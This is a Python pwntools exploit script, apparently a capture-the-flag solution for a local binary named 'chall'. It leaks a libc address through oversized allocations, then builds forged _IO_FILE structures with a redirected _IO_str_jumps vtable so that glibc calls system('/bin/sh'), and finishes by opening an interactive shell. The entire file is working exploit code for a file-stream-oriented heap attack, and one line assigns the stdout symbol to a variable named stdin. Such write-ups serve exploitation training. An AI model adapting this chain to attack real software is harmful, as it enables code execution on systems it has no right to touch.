from pwn import *

context.arch = "amd64"
context.log_level = "error"

p = process("./chall")


def send(data, delim=":"):
    if isinstance(data, str):
        data = data.encode()

    if isinstance(delim, str):
        delim = delim.encode()

    p.sendlineafter(delim, data, timeout=1)


def create(alloc_size, write_size, data):
    send(b"1", b">")
    send(str(alloc_size).encode())
    send(str(write_size).encode())

    if isinstance(data, str):
        data = data.encode()

    send(data)


# gdb.attach(p)

create(0x200000, 0x5ED761, "a")

create(0x200000, 0x5ED761 + 0x201010, "b")

t = p.readuntil(b" / ")

print(t.hex())

leak = u64(t[9:17])
print(hex(leak))

libc = ELF("./libc.so.6")
libc.address = leak - 0x3ED8B0

stdout = libc.symbols["_IO_2_1_stdout_"]
stdin = libc.symbols["_IO_2_1_stdout_"]

wide_data = libc.address + 0x3EB8C0
stdfile_lock = libc.address + 0x3ED8C0

io_str_jumps = libc.address + 0x3E8360

system = libc.sym["system"]

io_jump_file = libc.sym["_IO_file_jumps"]

bin_sh = next(libc.search(b"/bin/sh"))

fake  = p64(0xFBAD1800)          # original _flags & ~_IO_USER_BUF
fake += p64(0) * 6               # _IO_read_ptr to _IO_write_base
fake += p64(bin_sh)              # _IO_write_end and _IO_buf_base
fake += p64(0) * 9               # _IO_save_base to _markers
fake += p64(stdfile_lock)        # _lock
fake += p64(0) * 9               # _codecvt
fake += p64(io_str_jumps - 0x28) # vtable
fake += p64(system) * 2          # _s._allocate_buffer

create(0x200000, 0x9EEA29, fake)

payload  = p64(0xFBAD208B)
payload += p64(stdout + 0xD8)
payload += p64(0) * 5
payload += p64(stdout)
payload += p64(stdin + 0x2000)
payload += p64(0) * 7
payload += b"\x00" * 4

p.send(payload)

fake  = p64(0xFBAD1800)               # original _flags & ~_IO_USER_BUF
fake += p64(0) * 4                   # _IO_read_ptr to _IO_write_base
fake += p64((bin_sh - 100) // 2)     # _IO_write_ptr
fake += p64(0) * 2                   # _IO_write_end and _IO_buf_base
fake += p64((bin_sh - 100) // 2)     # _IO_buf_end
fake += p64(0) * 8                   # _IO_save_base to _markers
fake += p64(stdfile_lock)            # _lock
fake += p64(0) * 9                   # _freeres_list
fake += p64(io_str_jumps - 0x20)     # vtable
fake += p64(system)                  # _s._allocate_buffer
fake += p64(stdout)                  # _s._free_buffer

# gdb.attach(p)

p.sendline(fake)

# p.sendline(p64(libc.address - 0x603000 + 0x10))

p.interactive()
